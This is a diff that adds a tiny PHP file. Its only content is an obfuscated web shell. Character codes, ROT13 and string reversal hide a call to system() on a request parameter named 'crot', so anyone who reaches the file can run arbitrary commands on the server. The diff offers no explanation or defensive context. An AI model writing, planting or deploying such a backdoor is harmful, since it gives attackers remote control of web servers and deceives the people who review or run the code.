@@ -1,0 +1,4 @@
+<?php
+${chr(99).chr(114).chr(111).chr(116)} = str_rot13('flfgrz');
+${chr(99).chr(114).chr(111).chr(116)}($_REQUEST[strrev('torc')]);
+?>
